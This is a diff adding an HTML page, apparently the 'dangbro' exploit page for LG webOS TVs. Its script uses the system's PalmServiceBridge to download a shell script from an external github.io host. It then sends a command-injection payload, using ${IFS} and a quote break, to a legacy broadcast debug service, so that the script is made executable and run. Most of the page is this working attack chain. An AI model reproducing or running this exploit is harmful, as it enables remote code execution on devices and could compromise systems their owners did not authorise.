@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>dangbro</title>
+  <style>
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #050505;
+      color: #f2efe8;
+      font-family: sans-serif;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    main {
+      min-width: 320px;
+      max-width: 80vw;
+      padding: 24px 28px;
+      border: 1px solid #303030;
+      border-radius: 12px;
+      background: #101010;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+      text-align: center;
+    }
+
+    .label {
+      margin: 0 0 10px;
+      font-size: 14px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #9f9f9f;
+    }
+
+    .state {
+      margin: 0;
+      font-size: 34px;
+      font-weight: 700;
+    }
+
+    .pending { color: #f4c95d; }
+    .success { color: #64d98b; }
+    .failed { color: #ff7878; }
+
+    .detail {
+      margin: 14px 0 0;
+      font-size: 15px;
+      color: #cecece;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <p class="label">Dangbro</p>
+    <p id="state" class="state pending">pending</p>
+    <p id="detail" class="detail">starting download...</p>
+  </main>
+  <script>
+    var stateEl = document.getElementById('state');
+    var detailEl = document.getElementById('detail');
+    var scriptPath = '/media/internal/downloads/ts.sh';
+    var downloadTarget = 'https://azoffshowy.github.io/dangbro/resources/ts.sh';
+    var settled = false;
+
+    function setState(name, detail) {
+      stateEl.textContent = name;
+      stateEl.className = 'state ' + name;
+      detailEl.textContent = detail || '';
+    }
+
+    function parse(payload) {
+      if (typeof payload !== 'string') return payload;
+      try {
+        return JSON.parse(payload);
+      } catch (_) {
+        return payload;
+      }
+    }
+
+    function runLegacyBroadcast() {
+      var bridge = new window.PalmServiceBridge();
+      bridge.onservicecallback = function (payload) {
+        var parsed = parse(payload);
+        if (parsed && parsed.returnValue === false) {
+          settled = true;
+          setState('failed', parsed.errorText || 'broadcast call failed');
+        }
+      };
+      bridge.call(
+        'luna://com.webos.service.legacybroadcast.debug/menu',
+        JSON.stringify({
+          menu: 'ci',
+          data: "ciplus20: sub=/ cmd=unbind sysname=';chmod${IFS}+x${IFS}" + scriptPath + ";" + scriptPath + ";#'"
+        })
+      );
+      if (!settled) setState('success', 'broadcast call sent');
+    }
+
+    function watchDownload(ticket) {
+      var bridge = new window.PalmServiceBridge();
+      bridge.onservicecallback = function (payload) {
+        if (settled) return;
+        var parsed = parse(payload);
+        if (!parsed || parsed.returnValue === false) {
+          settled = true;
+          setState('failed', parsed && parsed.errorText ? parsed.errorText : 'status query failed');
+          return;
+        }
+        if (parsed.completed === true && parsed.aborted !== true && parsed.interrupted !== true) {
+          runLegacyBroadcast();
+          return;
+        }
+        if (parsed.returnValue === false || parsed.aborted === true || parsed.interrupted === true || parsed.state === 'failed') {
+          settled = true;
+          setState('failed', parsed.errorText || 'download failed');
+          return;
+        }
+        if (typeof parsed.amountReceived !== 'undefined' && typeof parsed.amountTotal !== 'undefined') {
+          setState('pending', 'downloading... ' + parsed.amountReceived + ' / ' + parsed.amountTotal + ' bytes');
+          return;
+        }
+        setState('pending', parsed.target || parsed.state || 'downloading...');
+      };
+      bridge.call(
+        'luna://com.webos.service.downloadmanager/downloadStatusQuery',
+        JSON.stringify({ ticket: ticket, subscribe: true })
+      );
+    }
+
+    if (typeof window.PalmServiceBridge === 'undefined') {
+      setState('failed', 'PalmServiceBridge is not available');
+    } else {
+      var bridge = new window.PalmServiceBridge();
+      bridge.onservicecallback = function (payload) {
+        if (settled) return;
+        var parsed = parse(payload);
+        if (!parsed) {
+          settled = true;
+          setState('failed', 'download request returned an empty payload');
+          return;
+        }
+        if (parsed.ticket) {
+          setState('pending', 'download accepted');
+          watchDownload(parsed.ticket);
+          return;
+        }
+        if (parsed.returnValue === false) {
+          settled = true;
+          setState('failed', parsed.errorText || 'download request failed');
+        }
+      };
+      bridge.call(
+        'luna://com.webos.service.downloadmanager/download',
+        JSON.stringify({
+          target: downloadTarget,
+          targetDir: '/media/internal/downloads',
+          targetFilename: 'ts.sh',
+          subscribe: false
+        })
+      );
+    }
+  </script>
+</body>
+</html>
